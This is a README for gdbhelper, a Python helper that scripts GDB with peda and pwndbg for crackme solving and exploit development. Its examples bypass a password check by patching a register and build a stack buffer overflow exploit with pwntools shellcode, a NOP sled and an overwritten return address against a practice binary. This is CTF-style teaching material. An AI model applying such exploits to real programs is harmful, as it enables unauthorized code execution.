# gdbhelper
gdbhelper is a lightweight helper class to instrument GDB using Python. It also has minimum support for [peda](https://github.com/longld/peda)
commands and experimental support for [pwndbg](https://github.com/zachriggle/pwndbg).

The reason why I didn't just develop a GDB script is that I was really too lazy to learn the API. Plus I wanted to have
a very simple tool that could "keep" my previous debugging configuration without having to re-set it all. If you're
looking for that too, that's where that tool comes in handy!

## Installation
You can either use it in place or install it with setuptools like this:
```bash
$ sudo python setup.py install
```
If you want to modify it while still using it system-wide, you can use this:
```bash
$ sudo python setup.py develop
```
As the script uses [pwntools](https://github.com/Gallopsled/pwntools)'s "process" to launch GDB in a subprocess with an
interactive shell, you should define aliases accordingly. Here are mine:
```bash
alias pwndbg='echo "source ~/security/pwndbg/gdbinit.py" > ~/.gdbinit && /usr/bin/gdb'
alias peda='echo "source ~/security/peda/peda.py" > ~/.gdbinit && /usr/bin/gdb'
alias gdb='echo "" > ~/.gdbinit && /usr/bin/gdb'
```
This way, when you'll use Peda it will be able to launch it from anywhere on your system.

## Basics
Let's begin by using "crackme1" (32b). After an incredibly hard analysis we saw that `0x8048545` seems interesting
(`strcmp`) so we'll launch our program and break there to see what's going on.
```python
# coding=utf-8


from gdbhelper import Gdb


debug = Gdb("./crackme1")  # (1)
debug.bp("*0x8048545")  # (2)
debug.r("blurp", prompt=True)  # (3)
value = debug.reg("esp")[1]  # (4)
print(debug.x(value, "s"))  # (5)

```
1. We load the binary in GDB (it's not being run yet)
2. We set our breakpoint
3. We run the binary with its argument and inform gdbhelper that we wait for the GDB prompt (because of the BP) before
returning a result
4. We ask for the value of `ESP` (which is the 1st argument of `strcmp`)
5. We print it's value and voilà!

Let's now try with the "crackme2" (64b). After a quick analysis, we've come to that script (which is a nonsense but
that for the sake of the example):
```python
# coding=utf-8


from gdbhelper import Pwndbg


debug = Pwndbg("./crackme2", until="plz! \n")  # (1)
debug.bp("*0x40073f")  # (2)
debug.r()
debug.e("blabla", prompt=True)  # (3)
debug.i()  # (4)
debug.c()  # (5)
r = debug.e("niark", skipbp=True)  # (6) (will also print the debug info)
if "Password" in r:  # (7)
    debug.e("plop", prompt=True)
    debug.ni()  # (8)
    debug.set("$rax", "0")
    debug.c(until="Flag is: ")  # (9)
    print(debug.recv(prompt=True))  # (10)

```
1. This crackme waits for an input on `STDIN` so we tell gdbhelper that, before returning from every `recv`, it needs to
find the string `"plz !\n"`
2. We set our BP and run the program
3. We send our first output, `"blabla"`, and wait for Pwndbg's prompt (due to BP), with the `execute` method (`e` is
simply a short name)
4. As we want to perform multiple operations at that BP, we ask gdbhelper to open an interactive shell (which we quit
either with `^C` or `^D`) with the `interactive` method (`i` is simply a short name)
5. We continue the execution of the program
6. We send our second input (from the script but maybe we did a lot during the interactive session) and tell gdbhelper
to not stop the execution when meeting a BP and to wait for the usual `until` string; This has for effect to stack the
output, meaning that the `r` variable contains all output/debug info since we sent our input
7. If we find the string `"Password"` in `r`, that means we're still not finished (damn! That's hard!)
8. After sending our third input and stopping at the `strcmp` again, we're pissed and just decide to screw up the
crackme by simple stepping and setting `RAX` to `0` to bypass the comparison
9. We now wait for a new string, `"Flag is: "`, to return instead of the usual `"plz! \n"`
10. We print the flag (I don't think that's the good one though)

Let's try to exploit a program now with "exploit1" (32b). No explanation on how to exploit a basic BoF, just how to do
it with gdbhelper almost automatically.
```python
# coding=utf-8


from pwn import *
from gdbhelper import Peda


debug = Peda("./exploit1")
pattern = debug.pattern_create(268)  # (1)
debug.bp("*0x8048488")
debug.r(pattern, prompt=True)
buff = p32(int(debug.reg("esp")[1], 16))
debug.dis(1)  # (2)
debug.c(prompt=True)
offset = debug.pattern_offset(debug.reg("eip")[0][1:].decode("hex")[::-1])  # (3)
bug = "A" * offset + "B"*4 + "C"*(268 - offset - 4)
shellcode = asm(shellcraft.sh())
nop = asm(shellcraft.i386.nop())*(offset - len(shellcode))
bug = shellcode + nop + buff + "C"*(268 - offset - 4)
debug.hb("*%s" % hex(u32(buff)))  # (4)
debug.r("'%s'" % bug, prompt=True)  # (5)
debug.i()  # (6)

```
1. We create a pattern using Peda's `pattern_create` command then we launch the program, get our buffer's address
2. We disable the breakpoint, it won't be needed anymore and continue the execution until a segmentation fault occurs
3. We check the offset of `EIP` using Peda's `pattern_offset` command and then construct our exploit string using Pwntools
4. We set a hardware BP on the address of our buffer to break on our shellcode
5. We relaunch the program with our shellcode and wait for the HB to trigger
6. We use the interactive console to step into the shellcode and watch everything's going well!

You can obviously use all `gdbhelper.Gdb` methods from `gdbhelper.Peda` or `gdbhelper.Pwndbg`. I invite you to discover
all available methods of those three classes with their arguments by yourself.